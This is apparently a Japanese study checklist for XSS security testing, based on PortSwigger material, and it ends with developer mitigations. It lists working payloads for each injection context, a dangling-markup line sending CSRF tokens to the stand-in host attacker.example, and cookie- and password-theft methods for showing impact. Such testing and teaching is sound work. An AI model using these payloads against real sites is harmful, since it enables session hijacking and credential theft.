# クロスサイトスクリプティング(XSS) 診断チェックリスト

PortSwigger Web Security Academy の解説を読み、診断の手順として組み直したノートです。原文は転載していません。詳しい説明や演習は出典を見てください。Codexに技術レビューをさせ、指摘を反映した版です。

診断は、自分の管理下の環境か、書面で許可を得た対象にだけ行います。本物のCookie・パスワード・個人情報を外部に送る必要はありません。影響の証明は、無害な値やダミーのDOM操作で十分です。

## 1. 3つの型を区別する

反射型・格納型と、DOMベースは、同じ軸の分類ではありません。反射型・格納型は「入力がどこから来て、どれだけ持続するか」、DOMベースは「不安全な処理が主にどこ(クライアント側)で起きるか」を表します。組み合わさることもあります(反射型DOM XSS、格納型DOM XSS)。

| 型 | 悪意のスクリプトの出どころ | 特徴 |
|---|---|---|
| 反射型(Reflected) | 今回のHTTPリクエスト | 攻撃者が作ったURLをクリックさせる必要がある。ログイン状態のタイミングが合わないと成立しない |
| 格納型(Stored) | アプリのDBなど、保存された場所 | 一度仕込めば、サイト内で待つだけでよい。ログイン中のユーザーに確実に当たる |
| DOMベース | クライアント側のJavaScriptの処理 | 画面のHTML(View Source)には出ない。値の変換を追わないと見つからない |

Self-XSS(被害者自身が開発者ツールに貼るなど、本人の操作でしか発火しない)は、第三者に到達する経路がなければ低リスクとして扱う。別の攻撃経路(クリックジャッキングなど)があるかを分けて検討する。

## 2. 疑う場所

- URLのクエリ文字列、メッセージボディのパラメータ、URLのファイルパス自体
- HTTPヘッダー(`User-Agent`など)。手元で書き換えられても、被害者のリクエストでそのヘッダーを攻撃者が実際に制御できるかは別問題。制御できないなら、第三者への実害としては成立しにくい(保存されて管理画面に出るなら、格納型として別経路になる)
- コメント、ニックネーム、注文時の連絡先など、ユーザーが送信する値
- メール本文(Webメール)、SNSの投稿(SNS連携)、ネットワーク上のパケットデータ(監視アプリ)など、HTTPリクエスト以外の経路から来るデータ
- DOMベースのソース: `location`(`search`/`hash`/`pathname`など)、`document.URL`、`document.documentURI`、`document.referrer`、`document.cookie`、`window.name`、Web Storage、`postMessage`の受信データ

格納型は、入れた場所(エントリポイント)と出た場所(エグジットポイント)が別の画面・別の機能になることが多い。入力者自身の画面だけでなく、管理者・モデレーター・サポート担当者・別テナント・メール通知・PDF生成・モバイルクライアントなど、出力先を広く確認する。

本番環境では、保存される入力点に無差別にマーカーを送らない。保存先、閲覧者、通知先を先に確認し、第三者や管理者の画面に影響しない形で進める。

## 3. 確認の手順

### 3-1. 反射型・格納型

1. **ユニークな値を送る**: 短い英数字の文字列(8文字程度)を、許可された入力点に個別に送る。入力検証を通りやすく、応答内で偶然一致しない程度の長さにする。
2. **反射箇所を探す**: 応答の中にその文字列が出てくる位置をすべて洗い出す。
3. **変換を確認する**: `< > " ' & \` や改行が、削除・置換・HTMLエンコード・JavaScriptエスケープ・URLエンコードのどれを受けているかを確認する。これを先に見ないと、次のペイロード選びが当てずっぽうになる。
4. **コンテキストを特定する**: HTMLタグの間のテキストか、タグの属性値か(引用符の有無)、URL属性か、インラインイベントハンドラか、JavaScript文字列・テンプレートリテラルか、など(5章)。
5. **候補ペイロードを試す**: 元のユニーク文字列を残したまま前後にペイロードを置くと、どこで動いたか追いやすい。
6. **改変・ブロックされたら、変換のパターンに合わせて別のペイロードを試す**。
7. **実行の証拠を確認する**: タグがDOMに生成された、エンコードされずに出た、というだけでは実行の証拠にならない。イベントが実際に発火したか、CSPで拒否されていないかを確認する。実ブラウザで `alert()` などが動くか見る。

格納型は、送信直後の応答にだけ出ているなら、ただの反射であって格納型ではない。別のリクエストをまたいで出るかを確認する。

### 3-2. DOMベース

1. **URL由来のソースを疑う**: `location.search`・`location.hash`・`pathname`にユニークな文字列を入れる。
2. **HTML系シンク**: 開発者ツールでDOM(レンダリング後)を検索する。ブラウザの「ページのソース」表示では、JavaScriptによる変更が反映されないため使えない。
3. **見つからなくても安全と決めない**: 値がデコード、部分抽出、連結、置換、Base64処理されている場合や、`eval`系・URL遷移系のシンクに直接渡っている場合は、文字列検索では見つからない。デバッガでソースからシンクまでの値の変換を追う。
4. **各段階のデコードを確認する**: ブラウザ、URL処理API、サーバー、フレームワーク、クライアント側ライブラリのどこで、何回デコードされるかを確認する(ブラウザによる`location.search`/`hash`のURLエンコードの有無も含む)。
5. **ツールでの自動化**: Burpの組み込み機能(DOM Invader)や静的・動的解析のスキャナを使うと、手作業の負担を減らせる。

発火にユーザー操作(クリック、`hashchange`、メッセージ受信など)が必要かどうかも記録する。発火条件によって、影響と再現性の評価が変わる。

## 4. 危険なシンク(書き込み先)

一律に「このシンクは危険」と決めず、渡す値がHTML文字列かどうか、コード実行に至る経路かどうかで分ける。

| シンク | 注意点 |
|---|---|
| `document.write()` / `document.writeln()` | `<script>`タグが使える |
| `innerHTML` / `outerHTML` / `insertAdjacentHTML` | 挿入した`<script>`要素は通常は実行されないが、挿入自体が安全という意味ではない。イベント属性(`onerror`付きの`img`など)、SVG/MathML、URL属性といった別経路で実行に至る。`outerHTML`は代入先の要素自体が置き換わるため、保持していた要素参照がDOM外を指すことがある(診断ツールでの混乱要因) |
| `setAttribute("on...", 値)` でのイベント属性設定、攻撃者入力を含むHTML文字列の挿入によって生成されるインラインイベント属性 | 危険。一方、`element.onclick = 文字列` のようにDOMプロパティへ文字列を代入しても、通常はイベントハンドラとしてコンパイルされない(関数オブジェクトを代入した場合は別) |
| jQueryの`html()` `append()` `before()` `after()` `wrap()` など | 渡す値がHTML文字列のとき危険。DOMノードを渡す場合は別 |
| jQueryの`$()`セレクタ(`location.hash`と`hashchange`の組み合わせなど) | jQueryのバージョンと入力形式に依存する。現行バージョンは先頭が`#`の文字列をHTMLと解釈しないよう修正されているが、`#`を使わずに入力を完全制御できる経路では今も成立しうる |
| コード実行シンク(`eval()`、`Function()`、文字列引数の`setTimeout()`/`setInterval()`、一部ライブラリのテンプレート評価) | 文字列がそのままコードとして評価される |
| `iframe`の`srcdoc`、`data:` URL、Blob URL | 実行可否はCSP・`sandbox`属性・ブラウザに依存する |

**DOM Clobbering**: スクリプトを直接実行できなくても、HTML(`id`や`name`属性)だけ注入できる場合、JavaScriptが参照するグローバル変数やDOMプロパティを上書きして、別のシンクに値を誘導できることがある。

## 5. コンテキストごとのペイロード

コンテキストと、3-1-3で確認した変換のパターンに応じて選ぶ。以下は代表例で、ブラウザやライブラリのバージョンに依存するものを含む。

### 5-1. HTMLタグの間(テキストノード)

- `<script>alert(document.domain)</script>`
- `<img src=1 onerror=alert(1)>`(`<script>`がブロックされる場合の代替)

### 5-2. HTMLタグの属性値の中

- 角括弧がブロックされていなければ、属性と周囲のタグを閉じて新しいタグを作る: `"><script>alert(document.domain)</script>`
- 角括弧がブロック・エンコードされている場合は、属性値だけ終端し、同じタグの中に新しい属性(イベントハンドラ)を追加する: `" autofocus onfocus=alert(document.domain) x="`
- `href`や`formaction`など、クリックやナビゲーションで実行される属性では`javascript:alert(document.domain)`の疑似プロトコルが効く場合がある。画像取得など、リソース取得のための属性(`img`の`src`など)には通常当てはまらない
- `canonical`タグなど通常イベントが発火しない属性では、`accesskey`属性とキー操作を組み合わせて発火させられる場合があるが、ユーザー操作が前提の限定的なPoCとして扱う

### 5-3. 既存のJavaScriptの中

- **スクリプトブロックの終了**: `</script><img src=1 onerror=alert(document.domain)>`。これはHTMLパーサーが`</script>`を見てscript要素を終了させる挙動によるもので、JavaScriptの構文としては成立していなくてもよい。
- **文字列リテラルから抜け出す**: コンテキストが`var input = 'ここに値'`のような引用符内なら、`'-alert(document.domain)-'`や`';alert(document.domain)//`のように引用符を閉じて続ける。
- **バックスラッシュエスケープの不備**: アプリが`'`だけを`\'`に変換し、入力中の`\`自体を処理していない場合に限り、攻撃者側の`\`でアプリが追加した`\`を無効化できる。アプリが`\`も適切にエスケープしていれば成立しない。
- **文字制限・WAF回避**: 丸括弧が使えないJavaScript実行コンテキストでは、`throw`文と例外ハンドラで関数を呼べる場合がある(`onerror=alert;throw 1`)。どのコンテキストで成立するかを確認する。
- **HTML属性内のJavaScriptでのHTMLエンコード利用**: イベントハンドラなど、HTML属性値の中に埋め込まれたJavaScriptでは、ブラウザが属性値をHTMLデコードした後にJavaScriptとして解釈するため、`&apos;`のような文字参照でクォートを再現できる場合がある。通常の`<script>...</script>`のraw text内では、この文字参照はデコードされない。
- **テンプレートリテラル**: 入力がバックティックで囲まれた既存のテンプレートリテラルの内部に入る場合に限り、リテラルを終端せず`${alert(document.domain)}`のように式を埋め込める。

### 5-4. クライアント側テンプレート(AngularJSなど)

`ng-app`属性があるページで、`{{ }}`の中にテンプレート式が実行される場合がある。フレームワークの有無・バージョン・サンドボックスの仕様によって成立条件が変わるため、使っているフレームワークとバージョンを特定したうえで調べる。

## 6. CSP(Content Security Policy)の確認

CSPヘッダーの有無だけで安全・危険を判断しない。HTTPヘッダーだけでなく`<meta>`要素で指定される場合もあり、`meta`では使えないディレクティブやタイミングの違いがある。

- `unsafe-inline`があっても、同じポリシーにnonceやhashが含まれていると、対応ブラウザは`unsafe-inline`を無視する(常に無効化されているとは限らない)。
- 許可ドメインに、顧客ごとにURLが分かれていないCDN(`ajax.googleapis.com`など)が入っていると、第三者がそのドメインにコンテンツを置ける可能性がある。実際にそのホスト上で読み込み可能なスクリプトや、オープンリダイレクトなどの悪用経路があるかを確認する。
- nonceは、存在するだけでは不十分。リクエストごとに暗号学的にランダムで、推測・再利用できないこと、攻撃者入力がnonce属性に注入されないことを確認する。
- hashは、許可対象のインラインコードと完全一致している必要がある。動的に変化するコードやイベント属性には使えない。
- `strict-dynamic`があると、nonce/hashで信頼されたスクリプトから動的に読み込まれるスクリプトにも信頼が伝播する。ホスト許可リストとは挙動が異なる。
- `img-src`などが許可されていれば、スクリプトは防げてもCSRFトークンなどの持ち出し(dangling markup、7章)は防げない。
- `report-uri`/`report-to`に、攻撃者が制御できるパラメータが反射されているだけでは、ディレクティブ注入は成立しない。区切り文字(セミコロンなど)を実際に注入できるか、既存ディレクティブとの順序やブラウザのパース結果を確認する。既存の`script-src`は通常上書きできないが、`script-src-elem`のような新しいディレクティブで上書きできる場合がある。

## 7. フルのXSSが無理なとき(dangling markup)

入力フィルタやCSPで`<script>`実行までは阻止されていても、角括弧や引用符のエスケープが漏れていれば、外部への通信を発生させる要素・属性(`img`の`src`など)を閉じないまま仕込める。

- 例: `value="入力値` に対し、`"><img src='//attacker.example?` を送ると、`img`タグの`src`属性が閉じられずに残る。ブラウザは次の引用符まで読み進めてURLと解釈するため、その間の応答内容(CSRFトークンなど)が攻撃者のサーバーへの通信に含まれる。取得できるのは、ブラウザが属性値として解釈し、URLに含めた範囲だけで、応答全体が自動的に送られるわけではない。
- 外部への通信を起こせる属性であれば、`img`以外でも成立する。
- CSPで防げる範囲は、漏えいに使う要素によって異なる(`img-src`は`img`での漏えいを防ぐが、`a`タグの`href`など別の属性を使う手口には`default-src`や`form-action`など別のディレクティブが関わる)。
- Chromeは、一部のURL属性に生の角括弧・改行が含まれる場合に読み込みを遮断する挙動を持つ。すべての角括弧・改行を一律にブロックするわけではなく、部分的な緩和として扱う。

## 8. 悪用の実例(影響を示すとき)

PoCとして`alert()`(Chrome 92以降、クロスオリジンのiframe内では使えないため必要なら`print()`)を使うのは、任意のJavaScriptが実行できることを示すだけ。`document.domain`は非推奨であり、sandbox化されたフレームなどでは期待どおり動かないこともあるので、環境によっては別の無害な証明(コンソール出力、無害なDOM変更など)を使う。

実害を示すなら、次のような実演を検討する。いずれも本物の認証情報を取得する必要はなく、無害な値での証明にとどめる。

- **Cookie窃取**: `document.cookie`を外部に送る。`HttpOnly`があると読めない。ただし`HttpOnly`はXSS自体を防ぐものではなく、同一オリジン上での他の操作や応答の読み取りは依然可能。`Secure`属性はJavaScriptからの読み取りを防ぐものではない。
- **パスワード窃取**: パスワード入力欄を注入し、パスワードマネージャーの自動入力を外部に送る。ブラウザ・マネージャーの設定やフォーム構造、オリジン判定に依存するため、必ず成立するとは限らない。
- **CSRF防御の回避**: 同一オリジンで読み取り可能なページやAPIからCSRFトークンを取得し、利用者の権限で操作できる場合がある。XSSは応答を読み取れる点が、通常のCSRF(送るだけで読めない)と違う。

## 9. 誤検知・見落としやすい点

- ユニーク文字列が応答に出ても、タグがDOMに生成されても、それだけでは実行の証拠にならない。イベントが発火したか、CSPで拒否されていないか、非表示・無効なDOMに入っていないかを確認する。
- `alert()`が出ないことは、脆弱性が無いことの証明にならない。ダイアログの抑止、`sandbox`、CSP、ユーザー操作要件、バックグラウンドタブでの制限などが原因で出ないことがある。
- 応答が`Content-Type: application/json`やダウンロード指定の場合、通常はHTMLとして解釈されない。一方、MIMEスニッフィングや直接ナビゲーションなど条件によっては解釈されることもあるため、最終的なレンダリングのされ方で判断する。
- サーバー側でHTMLエンコードされていても、後段のクライアント側JavaScriptがその値を読み取り、`innerHTML`や`eval`系に渡していれば、サーバー側のエンコードだけでは安全と判断できない。
- 逆に、応答本文に危険そうな文字列があっても、それがHTMLコメント内、`text/plain`、JSON文字列、エスケープ済みのスクリプト用データの中であれば、実行可能とは限らない。
- 格納型は、送信直後の応答にだけ出ているなら反射であって格納型ではない。別のリクエストをまたいで出るかを確認する。
- ヘッダー由来の反射は、そのヘッダーを攻撃者が被害者のリクエストで実際に制御できるかを確認する。手元で書き換えられるだけでは、第三者への実害の証明にならない場合がある。
- DOMベースは「ページのソースを表示」では見えない。開発者ツールでDOM(レンダリング後)を見る。文字列検索で見つからないケース(3-2-3)も踏まえる。
- CSPヘッダーの有無だけで安全・危険を判断しない。`unsafe-inline`とnonce/hashの組み合わせ、`report-uri`への反射など、実際に回避できるかを個別に確認する(6章)。
- WAFによる403、ペイロードの一部削除、ブラウザによるDOM補正は、それぞれ別の層での反応。どの層が入力を変えたのか分からないまま「フィルタで防御済み」と判断しない。
- Self-XSS(本人の操作でしか発火しない)と、第三者が到達できるXSSは影響が違う。第三者への到達経路が別途あるかを確認する。

## 10. 対策(開発側への指摘事項)

- **出力時エンコード**が基本。値を埋め込む最終的なコンテキスト(HTML本文、HTML属性、JavaScript、URL、CSS)に対応する処理を使う。1つの値を複数のコンテキストに直接埋め込む設計は避ける。何重にもエンコードすれば安全という意味ではなく、各パーサーの処理順序に合わせることが重要。
- JavaScriptへ値を埋め込む場合は、手作業のバックスラッシュ置換ではなく、安全なJSONシリアライズやデータ属性経由、別のJSONレスポンスを使う。`</script>`によるHTMLパーサー脱出も考慮する。
- URLは、HTMLエンコードだけでは不十分。許可スキーム(`http`/`https`)・許可ホストを構造的に検証する。`javascript:`をHTMLエンコードしても、ブラウザが属性値をデコードすれば安全にならない。
- DOM操作では、可能な限り`textContent`、`createTextNode()`、固定の属性名に対する`setAttribute()`など、HTMLとして解釈されないAPIを使う。URL属性やイベント属性には別途の検証が必要。
- **入力時の検証**をエンコードと組み合わせる。URLを受け取るなら安全なプロトコルで始まるかを確認する。数値を期待するなら整数かを確認する。ホワイトリスト方式を基本にする。
- **ユーザーに一部のHTMLを許可する機能**は避けられる場合は避ける。必要な場合は、保守されている最新版のDOMPurifyのような専用ライブラリを使い、許可するタグ・属性を必要最小限にし、サニタイズ後に文字列を改変しない。mutation XSS(サニタイズを通過したマークアップが、ブラウザの再構築・再シリアライズ後に危険な構造へ変わる現象)が既知の問題として起きることがあるため、更新を追いかける。
- **テンプレートエンジン**のデフォルトエスケープ(Jinja、Reactなど)に頼る場合も、`safe`/`raw`/三重波括弧のような無効化機能、インラインJavaScript・URL・動的属性名には別の対応が必要。ユーザー入力をエスケープなしのテンプレート文字列に直接連結すると、サーバーサイドテンプレートインジェクションにもなる。
- 対応ブラウザでは、Trusted Typesで`innerHTML`などの危険なシンクに任意文字列が渡ることを制限できる。
- Cookieには`HttpOnly`・`Secure`・適切な`SameSite`を設定する。これらはXSSの発生そのものを防ぐものではなく、発生後の影響を軽減する対策として位置づける。
- **CSP**は、出力処理の実装ミスが残った場合の実行抑止・影響軽減を担う多層防御の一つとして使う。`default-src 'self'`のような制限的なポリシーを基本にし、外部ドメインの許可は最小限にする。やむを得ず外部を許可するなら、nonceかhashベースにする。
